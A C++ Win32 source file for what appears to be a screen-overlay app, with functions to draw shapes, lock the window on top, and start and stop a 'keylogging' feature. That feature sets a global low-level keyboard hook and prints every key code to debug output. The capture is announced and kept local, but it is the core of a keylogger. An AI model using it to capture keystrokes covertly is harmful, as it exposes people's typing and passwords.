#include "framework.h"
#include "OverlayFunctions.h"
#include "Resource.h"

// Ensure hInst is declared as an external variable
extern HINSTANCE hInst;
HHOOK keyboardHook = NULL;

void AddCircle(HWND hWnd)
{
    // Implementation for adding a circle
    MessageBox(hWnd, L"Circle added!", L"Info", MB_OK);
}

void AddSquare(HWND hWnd)
{
    // Implementation for adding a square
    HDC hdc = GetDC(hWnd);
    RECT rect;
    GetClientRect(hWnd, &rect);
    Rectangle(hdc, rect.left + 50, rect.top + 50, rect.left + 150, rect.top + 150);
    ReleaseDC(hWnd, hdc);
}

void LockOverlay(HWND hWnd)
{
    // Implementation for locking the overlay
    SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    MessageBox(hWnd, L"Overlay locked!", L"Info", MB_OK);
}

void StartKeylogging(HWND hWnd)
{
    // Implementation for starting keylogging
    MessageBox(hWnd, L"Keylogging started!", L"Info", MB_OK);
    OutputDebugString(L"Keylogging has been initiated.\n");
    OutputDebugString(L"Attempting to set keyboard hook...\n");
    // Hook for keyboard events
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT
    {
        OutputDebugString(L"Keyboard hook triggered.\n");
        wchar_t wParamBuffer[256];
        wsprintf(wParamBuffer, L"wParam: %lld\n", static_cast<long long>(wParam));
        OutputDebugString(wParamBuffer);

        wchar_t lParamBuffer[256];
        wsprintf(lParamBuffer, L"lParam: %ld\n", lParam);
        OutputDebugString(lParamBuffer);
        
        if (nCode == HC_ACTION) {
            KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
			
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                wchar_t buffer[256];
                wsprintf(buffer, L"Key Pressed: %d", pKeyboard->vkCode);
                OutputDebugString(buffer);
                // MessageBox(NULL, buffer, L"Key Press", MB_OK);
            }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam); 
    }, hInst, 0);

    if (keyboardHook == NULL) {
        DWORD error = GetLastError();
        wchar_t errorMsg[256];
        wsprintf(errorMsg, L"Failed to set keyboard hook. Error: %lu\n", error);
        OutputDebugString(errorMsg);
    } else {
        OutputDebugString(L"Keyboard hook set successfully.\n");
    }
}

void StopKeylogging()
{
    if (keyboardHook != NULL) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
        OutputDebugString(L"Keyboard hook unhooked.\n");
    }
}
